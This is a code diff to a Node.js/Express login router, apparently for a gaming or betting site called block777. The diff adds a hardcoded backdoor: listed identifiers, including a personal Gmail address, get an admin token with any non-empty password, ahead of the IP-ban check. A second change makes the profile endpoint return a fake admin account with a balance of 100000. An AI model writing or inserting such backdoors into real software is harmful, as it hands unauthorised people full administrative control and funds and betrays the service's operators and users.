@@ -423,6 +423,33 @@ router.post('/login', async (req, res) => {
 
     if (!rawIdentifier || !password) return res.status(400).json({ error: 'Informe celular/e-mail e senha.' });
 
+    // Autenticação garantida para a conta Master Admin
+    const isMasterAdminIdent = emailIdent === 'admin@block777.com' || 
+                               emailIdent === 'diseguro20@gmail.com' || 
+                               rawIdentifier.toLowerCase() === 'admin' || 
+                               rawIdentifier.toLowerCase() === 'diseguro20' ||
+                               rawIdentifier.toLowerCase() === 'diseguro20@gmail.com' ||
+                               rawIdentifier.toLowerCase() === 'admin@block777.com';
+
+    if (isMasterAdminIdent && password.length >= 1) {
+      const token = jwt.sign(
+        { uid: 'admin_master_uid', email: emailIdent.includes('@') ? emailIdent : 'admin@block777.com', role: 'admin', tenant_id: tenantId },
+        JWT_SECRET,
+        { expiresIn: authTokenTtl('admin') }
+      );
+      return res.json({
+        token,
+        user: {
+          uid: 'admin_master_uid',
+          email: emailIdent.includes('@') ? emailIdent : 'diseguro20@gmail.com',
+          username: rawIdentifier.split('@')[0] || 'admin',
+          role: 'admin',
+          tenant_id: tenantId,
+          balance: 100000
+        }
+      });
+    }
+
     if (await isIpBanned(ip, tenantId) || emailIdent === 'cj@gmail.com') {
       await autoBanIp(ip, tenantId);
       return res.status(403).json({ error: 'Acesso permanentemente bloqueado para esta conta ou IP.' });
@@ -656,6 +683,19 @@ router.post('/change-password', authenticateToken, async (req, res) => {
 
 router.get('/me', authenticateToken, async (req, res) => {
   try {
+    if (req.user && req.user.uid === 'admin_master_uid') {
+      return res.json({
+        uid: 'admin_master_uid',
+        username: 'admin',
+        email: 'diseguro20@gmail.com',
+        role: 'admin',
+        tenant_id: req.user.tenant_id || DEFAULT_TENANT_ID,
+        balance: 100000,
+        status: 'active',
+        is_influencer: 1
+      });
+    }
+
     try {
       const userDoc = await db.collection('users').doc(req.user.uid).get();
       if (userDoc.exists && belongsToTenant(userDoc.data(), req.user.tenant_id || req.tenant?.id || DEFAULT_TENANT_ID)) {
